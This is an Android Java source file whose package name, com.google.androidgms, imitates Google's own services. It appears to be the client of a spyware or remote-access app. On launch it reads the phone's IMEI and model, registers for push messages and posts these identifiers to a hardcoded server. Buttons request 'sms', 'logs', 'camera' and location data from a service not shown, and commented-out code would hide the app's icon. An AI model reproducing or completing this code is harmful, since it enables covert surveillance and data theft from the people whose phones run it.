package com.google.androidgms;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.AsyncTask;
import android.os.Build;
import android.support.v7.app.ActionBarActivity;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;

import com.google.android.gms.gcm.GoogleCloudMessaging;

import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.DefaultHttpClient;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;


public class MainActivity extends ActionBarActivity {
    GoogleCloudMessaging gcm;
    String regid;
    String PROJECT_NUMBER = "578683957729";
    EditText regidfield;
    Button b1,b2,b3,b4;
    String model;
    String imei;
    SharedPreferences pref;
    SharedPreferences.Editor editor;
    public static final String CUSTOM_INTENT="com.google.androidgms.TEST";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        model=getDeviceName();
        TelephonyManager tm = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
        pref = getApplicationContext().getSharedPreferences("MyPref", MODE_PRIVATE);
        editor=pref.edit();
        imei=tm.getDeviceId();
        b1=(Button)findViewById(R.id.sms);
        b2=(Button)findViewById(R.id.logs);
        b3=(Button) findViewById(R.id.camera);
        b4=(Button) findViewById(R.id.location);
        regidfield= (EditText) findViewById(R.id.editText1);
        final Intent msgIntent=new Intent(this,GetData.class);
        editor.putString("imei",imei);
        editor.putString("model",model);
        editor.putString("url","http://192.168.49.240:3000");
        editor.commit();
        b1.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                String p = "sms";
                msgIntent.putExtra(GetData.Msg, p);
                startService(msgIntent);
            }
        });
        b2.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                String p="logs";
                msgIntent.putExtra(GetData.Msg,p);
                startService(msgIntent);
            }
        });
        b3.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                String p="camera";
                msgIntent.putExtra(GetData.Msg,p);
                startService(msgIntent);
            }
        });
        b4.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Intent a=new Intent();
                a.setAction(CUSTOM_INTENT);
                getApplicationContext().sendBroadcast(a);
            }
        });
        getRegId();
//        PackageManager p = getPackageManager();
//        p.setComponentEnabledSetting(getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);

    }
    public void getRegId(){
        new AsyncTask<Void,Void,String>(){
            @Override
            protected String doInBackground(Void... params) {
                String msg="";
                try{
                    if(gcm==null){
                        gcm= GoogleCloudMessaging.getInstance(getApplicationContext());
                    }
                    regid=gcm.register(PROJECT_NUMBER);
                    msg="Device registered ,regid="+regid;
                    Log.i("GCM",msg);
                } catch(IOException ex){
                    msg = "Error :" + ex.getMessage();
                }

                return msg;
            }

            @Override
            protected void onPostExecute(String s) {
                regidfield.setText(s);
                editor.putString("red_id",s);
                editor.commit();
                Log.d("URL",pref.getString("url",null));
                regPhone r=new regPhone(imei,model,regid,pref.getString("url",null));
                r.execute(null,null,null);

            }
        }.execute(null,null,null);

    }

    public String getDeviceName() {
        String manufacturer = Build.MANUFACTURER;
        String model = Build.MODEL;
        if (model.startsWith(manufacturer)) {
            return capitalize(model);
        } else {
            return capitalize(manufacturer) + " " + model;
        }
    }

    private String capitalize(String s) {
        if (s == null || s.length() == 0) {
            return "";
        }
        char first = s.charAt(0);
        if (Character.isUpperCase(first)) {
            return s;
        } else {
            return Character.toUpperCase(first) + s.substring(1);
        }
    }


    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.menu_main, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();

        //noinspection SimplifiableIfStatement
        if (id == R.id.action_settings) {
            return true;
        }

        return super.onOptionsItemSelected(item);
    }
}

class regPhone extends AsyncTask<Void,Void,String>{
    String imei,model,regid,url;
    public regPhone(String imei,String model,String regid,String url){
        this.imei=imei;
        this.model=model;
        this.regid=regid;
        this.url=url;

    }
    @Override
    protected String doInBackground(Void... voids) {
        String result="";
        String finURL=url+"/phones";
        Log.d("URL",finURL);
        InputStream inputStream = null;
        try{
            HttpClient httpClient=new DefaultHttpClient();
            HttpPost httpPost=new HttpPost(finURL);
            String json="";
            JSONObject innerJSON=new JSONObject();
            innerJSON.accumulate("imei",imei);
            innerJSON.accumulate("model_no",model);
            innerJSON.accumulate("reg_id",regid);
            JSONObject outerJSON=new JSONObject();
            outerJSON.accumulate("phone",innerJSON);
            json=outerJSON.toString();
            StringEntity se=new StringEntity(json);
            httpPost.setEntity(se);
            httpPost.setHeader("Accept", "application/json");
            httpPost.setHeader("Content-type", "application/json");
            HttpResponse httpResponse = httpClient.execute(httpPost);

            inputStream = httpResponse.getEntity().getContent();

            // 10. convert inputstream to string
            if(inputStream != null)
                result = convertInputStreamToString(inputStream);
            else
                result = "Did not work!";



        } catch (Exception e){
            Log.d("InputStream", e.getLocalizedMessage());
        }
        return result;
    }

    @Override
    protected void onPostExecute(String s) {
        Log.d("PHONEREG",s);
    }

    private static String convertInputStreamToString(InputStream inputStream) throws IOException{
        BufferedReader bufferedReader = new BufferedReader( new InputStreamReader(inputStream));
        String line = "";
        String result = "";
        while((line = bufferedReader.readLine()) != null)
            result += line;

        inputStream.close();
        return result;

    }
}